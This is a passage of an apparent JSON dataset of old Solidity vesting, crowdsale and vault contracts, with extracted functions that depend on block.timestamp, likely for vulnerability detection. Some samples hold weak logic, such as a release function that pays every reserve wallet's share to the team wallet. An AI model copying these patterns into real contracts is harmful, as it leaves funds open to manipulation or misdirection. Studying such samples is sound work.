institutionAllocation;\n stageSettings[teamWallet] = teamStageSetting;\n stageSettings[earlyWallet] = earlyStageSetting;\n stageSettings[institutionWallet] = institutionStageSetting;\n timeLockDurations[teamWallet] = teamTimeLock;\n timeLockDurations[earlyWallet] = earlyTimeLock;\n timeLockDurations[institutionWallet] = institutionTimeLock;\n }\n function releaseToken() onlyReserveWallets public{\n uint256 totalUnlocked = unlockAmount();\n require(totalUnlocked <= allocations[msg.sender]);\n require(releasedAmounts[msg.sender] < totalUnlocked);\n uint256 payment = totalUnlocked.sub(releasedAmounts[msg.sender]);\n releasedAmounts[msg.sender] = totalUnlocked;\n require(token.transfer(teamWallet, payment));\n }\n function unlockAmount() public view onlyReserveWallets returns(uint256){\n uint256 stage = vestStage();\n uint256 totalUnlocked = stage.mul(allocations[msg.sender]).div(stageSettings[msg.sender]);\n return totalUnlocked;\n }\n function vestStage() public view onlyReserveWallets returns(uint256){\n uint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);\n uint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);\n if(stage > stageSettings[msg.sender]){\n stage = stageSettings[msg.sender];\n }\n return stage;\n }\n}",
  "extract_feature": [
    "function allocateToken() onlyOwner public{\nrequire(block.timestamp > lockStartTime);\nrequire(allocations[teamWallet] == 0);\nrequire(token.balanceOf(address(this)) == totalAllocation);\nallocations[teamWallet] = teamAllocation;\nallocations[earlyWallet] = earlyAllocation;\nallocations[institutionWallet] = institutionAllocation;\nstageSettings[teamWallet] = teamStageSetting;\nstageSettings[earlyWallet] = earlyStageSetting;\nstageSettings[institutionWallet] = institutionStageSetting;\ntimeLockDurations[teamWallet] = teamTimeLock;\ntimeLockDurations[earlyWallet] = earlyTimeLock;\ntimeLockDurations[institutionWallet] = institutionTimeLock;\n}",
    "function vestStage() public view onlyReserveWallets returns(uint256){\nuint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);\nuint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);\nif(stage > stageSettings[msg.sender]){\nstage = stageSettings[msg.sender];\n}\nreturn stage;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f45"
  },
  "filename": "7753.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BVesting is Ownable {\n using SafeMath for uint256;\n address public teamWallet;\n address public earlyWallet;\n address public institutionWallet;\n uint256 public teamTimeLock = 1000 minutes;\n uint256 public earlyTimeLock = 5 * 30 minutes;\n uint256 public institutionTimeLock = 50 * 30 minutes;\n uint256 public teamAllocation = 15 * (10 ** 7) * (10 ** 18);\n uint256 public earlyAllocation = 5 * (10 ** 7) * (10 ** 18);\n uint256 public institutionAllocation = 15 * (10 ** 7) * (10 ** 18);\n uint256 public totalAllocation = 35 * (10 ** 7) * (10 ** 18);\n uint256 public teamStageSetting = 34;\n uint256 public earlyStageSetting = 5;\n uint256 public institutionStageSetting = 50;\n ERC20Basic public token;\n uint256 public start;\n uint256 public lockStartTime;\n mapping(address => uint256) public allocations;\n mapping(address => uint256) public stageSettings;\n mapping(address => uint256) public timeLockDurations;\n mapping(address => uint256) public releasedAmounts;\n modifier onlyReserveWallets {\n require(allocations[msg.sender] > 0);\n _;\n }\n function BVesting(ERC20Basic _token,\n address _teamWallet,\n address _earlyWallet,\n address _institutionWallet,\n uint256 _start,\n uint256 _lockTime)public{\n require(_start > 0);\n require(_lockTime > 0);\n require(_start.add(_lockTime) > 0);\n require(_teamWallet != address(0));\n require(_earlyWallet != address(0));\n require(_institutionWallet != address(0));\n token = _token;\n teamWallet = _teamWallet;\n earlyWallet = _earlyWallet;\n institutionWallet = _institutionWallet;\n start = _start;\n lockStartTime = start.add(_lockTime);\n }\n function allocateToken() onlyOwner public{\n require(block.timestamp > lockStartTime);\n require(allocations[teamWallet] == 0);\n require(token.balanceOf(address(this)) == totalAllocation);\n allocations[teamWallet] = teamAllocation;\n allocations[earlyWallet] = earlyAllocation;\n allocations[institutionWallet] = institutionAllocation;\n stageSettings[teamWallet] = teamStageSetting;\n stageSettings[earlyWallet] = earlyStageSetting;\n stageSettings[institutionWallet] = institutionStageSetting;\n timeLockDurations[teamWallet] = teamTimeLock;\n timeLockDurations[earlyWallet] = earlyTimeLock;\n timeLockDurations[institutionWallet] = institutionTimeLock;\n }\n function releaseToken() onlyReserveWallets public{\n uint256 stage = vestStage();\n uint256 totalUnlocked = stage.mul(allocations[msg.sender]).div(stageSettings[msg.sender]);\n require(totalUnlocked < allocations[msg.sender]);\n require(releasedAmounts[msg.sender] < totalUnlocked);\n uint256 payment = totalUnlocked - releasedAmounts[msg.sender];\n releasedAmounts[msg.sender] = totalUnlocked;\n require(token.transfer(teamWallet, payment));\n }\n function vestStage() public view onlyReserveWallets returns(uint256){\n uint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);\n uint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);\n if(stage > stageSettings[msg.sender]){\n stage = stageSettings[msg.sender];\n }\n return stage;\n }\n}",
  "extract_feature": [
    "function allocateToken() onlyOwner public{\nrequire(block.timestamp > lockStartTime);\nrequire(allocations[teamWallet] == 0);\nrequire(token.balanceOf(address(this)) == totalAllocation);\nallocations[teamWallet] = teamAllocation;\nallocations[earlyWallet] = earlyAllocation;\nallocations[institutionWallet] = institutionAllocation;\nstageSettings[teamWallet] = teamStageSetting;\nstageSettings[earlyWallet] = earlyStageSetting;\nstageSettings[institutionWallet] = institutionStageSetting;\ntimeLockDurations[teamWallet] = teamTimeLock;\ntimeLockDurations[earlyWallet] = earlyTimeLock;\ntimeLockDurations[institutionWallet] = institutionTimeLock;\n}",
    "function vestStage() public view onlyReserveWallets returns(uint256){\nuint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);\nuint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);\nif(stage > stageSettings[msg.sender]){\nstage = stageSettings[msg.sender];\n}\nreturn stage;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f46"
  },
  "filename": "7775.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n function TokenVesting(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n require(token.transfer(beneficiary, unreleased));\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n require(token.transfer(owner, refund));\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}",
  "extract_feature": [
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f47"
  },
  "filename": "7803.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract CappedToken is MintableToken {\n uint256 public cap;\n function CappedToken(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n require(totalSupply_.add(_amount) <= cap);\n return super.mint(_to, _amount);\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract CareerChainToken is CappedToken(145249999000000000000000000), BurnableToken {\n string public name = \"CareerChain Token\";\n string public symbol = \"CCH\";\n uint8 public decimals = 18;\n function burn(uint256 _value) public onlyOwner {\n _burn(msg.sender, _value);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract WhitelistedCrowdsale is Crowdsale, Ownable {\n mapping(address => bool) public whitelist;\n modifier isWhitelisted(address _beneficiary) {\n require(whitelist[_beneficiary]);\n _;\n }\n function addToWhitelist(address _beneficiary) external onlyOwner {\n whitelist[_beneficiary] = true;\n }\n function addManyToWhitelist(address[] _beneficiaries) external onlyOwner {\n for (uint256 i = 0; i < _beneficiaries.length; i++) {\n whitelist[_beneficiaries[i]] = true;\n }\n }\n function removeFromWhitelist(address _beneficiary) external onlyOwner {\n whitelist[_beneficiary] = false;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal isWhitelisted(_beneficiary) {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhileOpen {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract CareerChainPrivateSale is TimedCrowdsale, WhitelistedCrowdsale {\n using SafeMath for uint256;\n uint256 public tokensStillInLockup;\n uint256[6] public lockupEndTime;\n mapping(address => uint256) public balances;\n mapping(address => uint256) public released;\n uint256 public firstVestedLockUpAmount;\n uint256 public stagedVestedLockUpAmounts;\n function CareerChainPrivateSale\n (\n uint256 _openingTime,\n uint256 _closingTime,\n uint256 _rate,\n address _wallet,\n uint256[6] _lockupEndTime,\n uint256 _firstVestedLockUpAmount,\n uint256 _stagedVestedLockUpAmounts,\n CareerChainToken _token\n )\n public\n Crowdsale(_rate, _wallet, _token)\n TimedCrowdsale(_openingTime, _closingTime)\n {\n require(_lockupEndTime[0] >= block.timestamp);\n require(_lockupEndTime[1] >= _lockupEndTime[0]);\n require(_lockupEndTime[2] >= _lockupEndTime[1]);\n require(_lockupEndTime[3] >= _lockupEndTime[2]);\n require(_lockupEndTime[4] >= _lockupEndTime[3]);\n require(_lockupEndTime[5] >= _lockupEndTime[4]);\n lockupEndTime = _lockupEndTime;\n firstVestedLockUpAmount = _firstVestedLockUpAmount;\n stagedVestedLockUpAmounts = _stagedVestedLockUpAmounts;\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n uint256 newTokensSold = tokensStillInLockup.add(_tokenAmount);\n require(newTokensSold <= token.balanceOf(address(this)));\n tokensStillInLockup = newTokensSold;\n balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);\n }\n function TransferUnsoldTokensBackToTokenContract(address _beneficiary) public onlyOwner {\n require(hasClosed());\n uint256 unSoldTokens = token.balanceOf(address(this)).sub(tokensStillInLockup);\n token.transfer(_beneficiary, unSoldTokens);\n }\n function IssueTokensToInvestors(address _beneficiary, uint256 _amount) public onlyOwner onlyWhileOpen{\n require(_beneficiary != address(0));\n _processPurchase(_beneficiary, _amount);\n }\n function _changeRate(uint256 _rate) public onlyOwner {\n require(_rate > 0);\n rate = _rate;\n }\n function releasableAmount() private view returns (uint256) {\n return vestedAmount().sub(released[msg.sender]);\n }\n function vestedAmount() private view returns (uint256) {\n uint256 lockupStage = 0;\n uint256 releasable = 0;\n uint256 i=0;\n while (i < lockupEndTime.length && lockupEndTime[i]<=now)\n {\n lockupStage = lockupStage.add(1);\n i = i.add(1);\n }\n if(lockupStage>0)\n {\n releasable = (lockupStage.sub(1).mul(stagedVestedLockUpAmounts)).add(firstVestedLockUpAmount);\n }\n return releasable;\n }\n function withdrawTokens() public {\n uint256 tobeReleased = 0;\n uint256 unreleased = releasableAmount();\n if(balances[msg.sender] >= unreleased && lockupEndTime[lockupEndTime.length-1] > now)\n {\n tobeReleased = unreleased;\n }\n else\n {\n tobeReleased = balances[msg.sender];\n }\n require(tobeReleased > 0);\n balances[msg.sender] = balances[msg.sender].sub(tobeReleased);\n tokensStillInLockup = tokensStillInLockup.sub(tobeReleased);\n released[msg.sender] = released[msg.sender].add(tobeReleased);\n _deliverTokens(msg.sender, tobeReleased);\n }\n}",
  "extract_feature": [
    "function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {\nrequire(_openingTime >= block.timestamp);\nrequire(_closingTime >= _openingTime);\nopeningTime = _openingTime;\nclosingTime = _closingTime;\n}",
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f48"
  },
  "filename": "7826.sol",
  "content": "pragma solidity 0.4.24;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract CALLGToken is MintableToken {\n string public name = \"CAPITAL GAS\";\n string public symbol = \"CALLG\";\n uint8 public decimals = 18;\n}\ncontract CALLToken is MintableToken {\n string public name = \"CAPITAL\";\n string public symbol = \"CALL\";\n uint8 public decimals = 18;\n}\ncontract TeamVault is Ownable {\n using SafeMath for uint256;\n ERC20 public token_call;\n ERC20 public token_callg;\n event TeamWithdrawn(address indexed teamWallet, uint256 token_call, uint256 token_callg);\n constructor (ERC20 _token_call, ERC20 _token_callg) public {\n require(_token_call != address(0));\n require(_token_callg != address(0));\n token_call = _token_call;\n token_callg = _token_callg;\n }\n function () public payable {\n }\n function withdrawTeam(address teamWallet) public onlyOwner {\n require(teamWallet != address(0));\n uint call_balance = token_call.balanceOf(this);\n uint callg_balance = token_callg.balanceOf(this);\n token_call.transfer(teamWallet, call_balance);\n token_callg.transfer(teamWallet, callg_balance);\n emit TeamWithdrawn(teamWallet, call_balance, callg_balance);\n }\n}\ncontract BountyVault is Ownable {\n using SafeMath for uint256;\n ERC20 public token_call;\n ERC20 public token_callg;\n event BountyWithdrawn(address indexed bountyWallet, uint256 token_call, uint256 token_callg);\n constructor (ERC20 _token_call, ERC20 _token_callg) public {\n require(_token_call != address(0));\n require(_token_callg != address(0));\n token_call = _token_call;\n token_callg = _token_callg;\n }\n function () public payable {\n }\n function withdrawBounty(address bountyWallet) public onlyOwner {\n require(bountyWallet != address(0));\n uint call_balance = token_call.balanceOf(this);\n uint callg_balance = token_callg.balanceOf(this);\n token_call.transfer(bountyWallet, call_balance);\n token_callg.transfer(bountyWallet, callg_balance);\n emit BountyWithdrawn(bountyWallet, call_balance, callg_balance);\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n constructor(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n emit Closed();\n wallet.transfer(address(this).balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n emit RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n emit Refunded(investor, depositedValue);\n }\n}\ncontract FiatContract {\n function USD(uint _id) constant returns (uint256);\n}\ncontract CapitalTechCrowdsale is Ownable {\n using SafeMath for uint256;\n ERC20 public token_call;\n ERC20 public token_callg;\n FiatContract public fiat_contract;\n RefundVault public vault;\n TeamVault public teamVault;\n BountyVault public bountyVault;\n enum stages { PRIVATE_SALE, PRE_SALE, MAIN_SALE_1, MAIN_SALE_2, MAIN_SALE_3, MAIN_SALE_4, FINALIZED }\n address public wallet;\n uint256 public maxContributionPerAddress;\n uint256 public stageStartTime;\n uint256 public weiRaised;\n uint256 public minInvestment;\n stages public stage;\n bool public is_finalized;\n bool public powered_up;\n bool public distributed_team;\n bool public distributed_bounty;\n mapping(address => uint256) public contributions;\n mapping(address => uint256) public userHistory;\n mapping(uint256 => uint256) public stages_duration;\n uint256 public callSoftCap;\n uint256 public callgSoftCap;\n uint256 public callDistributed;\n uint256 public callgDistributed;\n uint256 public constant decimals = 18;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount_call, uint256 amount_callg);\n event TokenTransfer(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount_call, uint256 amount_callg);\n event StageChanged(stages stage, stages next_stage, uint256 stageStartTime);\n event GoalReached(uint256 callSoftCap, uint256 callgSoftCap);\n event Finalized(uint256 callDistributed, uint256 callgDistributed);\n function () external payable {\n buyTokens(msg.sender);\n }\n constructor(address _wallet, address _fiatcontract, ERC20 _token_call, ERC20 _token_callg) public {\n require(_token_call != address(0));\n require(_token_callg != address(0));\n require(_wallet != address(0));\n require(_fiatcontract != address(0));\n token_call = _token_call;\n token_callg = _token_callg;\n wallet = _wallet;\n fiat_contract = FiatContract(_fiatcontract);\n vault = new RefundVault(_wallet);\n bountyVault = new BountyVault(_token_call, _token_callg);\n teamVault = new TeamVault(_token_call, _token_callg);\n }\n function powerUpContract() public onlyOwner {\n require(!powered_up);\n require(!is_finalized);\n stageStartTime = block.timestamp;\n stage = 